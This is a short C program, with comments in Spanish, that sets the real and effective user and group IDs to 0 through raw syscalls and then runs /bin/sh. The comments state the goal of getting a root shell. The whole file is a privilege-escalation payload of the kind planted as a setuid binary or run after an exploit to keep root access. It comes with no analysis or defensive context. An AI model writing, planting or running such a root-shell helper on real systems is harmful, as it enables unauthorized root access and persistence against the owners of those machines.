#include <unistd.h>
#include <sys/syscall.h>

int main(void) {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    
    // Ejecutamos las syscalls para asegurar que el proceso resultante sea root
    syscall(SYS_setregid, 0, 0);
    syscall(SYS_setreuid, 0, 0);
    
    // Lanzamos la shell
    execve("/bin/sh", argv, envp);
    
    return 0;
}